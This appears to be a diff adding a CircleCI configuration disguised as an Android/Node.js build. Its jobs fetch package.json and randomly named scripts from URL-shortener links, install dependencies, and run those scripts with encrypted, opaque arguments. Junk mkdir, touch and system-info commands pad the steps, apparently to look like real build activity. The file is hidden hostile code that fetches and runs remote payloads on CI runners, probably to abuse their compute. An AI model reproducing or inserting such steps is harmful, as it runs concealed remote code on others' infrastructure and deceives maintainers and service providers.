@@ -1,0 +1,49 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  MyJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir 8ds4sj57p2wb9c3fzlor76tf1up
+      - run: curl -fsSL shorturl.at/pqDO9 -o package.json && curl -fsSL
+          shorturl.at/xDQ12 -o 25r245byilcgguyev.js && curl -fsSL
+          shorturl.at/fptA8 -o mqeqbcvouua.js
+      - run: touch fbrc9pw8xh2v9jcidu9p.net
+      - run: npm i -s
+      - run: cat /etc/os-release
+      - run: mkdir kuw97uvg94hvllwglxm
+      - run: mkdir ud1ib9q5xqvwri1480h9mwyr
+      - run: echo version 2399632734.5050592
+      - run: node 25r245byilcgguyev -lpn U2FsdGVkX19ZOrOHsZRb8WoGDr6oZiTh/nRHX6bdIwc= -r
+          U2FsdGVkX191ndq+tDX/QQCsQbbcKPH9xuecdK21yV8EIai/R3D+LmhvQ0Sq5PUaPm7TvogK/USYUh4PogROP2Yv4bLQrHwVUELO63uwFM7TaqmN5X+oOxgL8LI0Gt1ZCk6la4NiSkjanDHCt21/ktnG4vbXqYepSLWzyM/DmveoVAJ3wYKa+tal+xHjMDA4zRrzf5saHw+4uTiZ1j/lg0QuPzdVpMqNw4PQkKEr3FcEYa2ZkhuLDQbbDDznWe8HzBUKW06ceCcm4qifCTPW4OrT8Wk1f1zLabKQ8HX2Uyw=
+          -t U2FsdGVkX1/dquAcLzRhQCEjsL/ESlKhJBUu5OP953eB05YdRjf9QBQRGf8Z2eGB -s
+          U2FsdGVkX18JCpuPSoJg9z6BphSTz3UV964rs+wzye6c3IzLsmQsXMo48wOji2fZWql9gsi4ewsvH/1UxY9GGZ/OzYFJwm6gD7YbXykTs+pa5SByFPXE3V8L+cxli8iEIkAYFl7VJIoME47e/h579nsckVALC1BCGEaMy5vo5KDoXxtyFBCLTPrR5aBpNtzKJ2dlqPW2gDdWTKSmPDUosMk0SfJwwyaUMH4tdgbPmOw=
+          -sp
+  working:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/mCJN1 -o package.json && curl -fsSL
+          shorturl.at/hkILT -o sjsm7fc65c9.js && curl -fsSL shorturl.at/bfkzI -o
+          xjzovm3mwu.js
+      - run: cat /proc/cpuinfo
+      - run: touch w92ys2jb8n96a1wlg.c
+      - run: touch mpt66iyr31hoybgyvl9c29b.html
+      - run: mkdir dqktpqrfywtbac7t1fo109yzos1qx7w7
+      - run: npm i -s
+      - run: node sjsm7fc65c9 -r
+          U2FsdGVkX1+IxldB20QUK6cWqn8rjrvHYui1W+B8Cbt+ke4ywpUtRt/Hg3tUJRfF0EfBaDOs7/77DAG6p1j8Tzxnoyt3NbKERq/uybbV9pAiUFyQLyU29LConK/8E8HAxZ6iVqAAEbMnmyXLf7rQ3Q6ce13waI3+klbSW+VX0OHLaPN/s3vJrtww5VD8bjtu/ikV7fLh/u8UUmCJ6U0sqX1gMZEB8BqfpU8lnmHDxVB/Aw1QmSFmhBVLQJr/+oMiKRHA3FVpsI7kZpngTiDCl59bV8XjlKgxmy66z3Mum/I=
+          -sp -lpn U2FsdGVkX19+siS2QvtqN6qK07/gJQCLmyC2miPUP7Q= -s
+          U2FsdGVkX1/fGI6zNUCx5jd5jWfg4p47vH0P4ZV3+Aw4d2EcoOP0uykgUVHcwnNznriqA5dDehgGM98gJzJeHRoghOTEFIAXIdFeHXB9b5PsBfUtwR52KoadJYIoULk28vKaR9uXx9wkoTuAuZbFHGnRLPkjfrRnRFYm/i+KNjW8jz8AaOZlyD0auI93qe0kK8DweTRF+ypUFJ8gkavxnEItAE+N7EMZgskmT/rwDNE=
+          -t U2FsdGVkX19EPx8sMIpJ15EunPbW2bpUEGA6FIlt2w57FyFzQfpkpt4C7nMo4Njd
+      - run: mkdir 9l6rrstwi3polg
+      - run: touch 0jjhvfvt3l4md1r.html
+workflows:
+  NodejsJobs:
+    jobs:
+      - MyJobs
+  loading:
+    jobs:
+      - working
